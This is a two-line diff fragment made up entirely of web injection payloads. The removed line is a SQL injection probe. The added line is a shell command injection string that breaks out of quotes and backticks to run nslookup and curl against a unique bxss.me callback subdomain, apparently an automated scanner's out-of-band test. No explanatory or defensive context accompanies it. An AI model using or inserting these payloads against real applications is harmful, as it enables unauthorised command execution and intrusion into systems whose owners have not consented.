@@ -1,1 +1,1 @@
--1' OR 2+77-77-1=0+0+0+1 or 'jL5Fgejt'='
+&(nslookup -q=cname hitjgyihgrevjc5715.bxss.me||curl hitjgyihgrevjc5715.bxss.me)&'\"`0&(nslookup -q=cname hitjgyihgrevjc5715.bxss.me||curl hitjgyihgrevjc5715.bxss.me)&`'
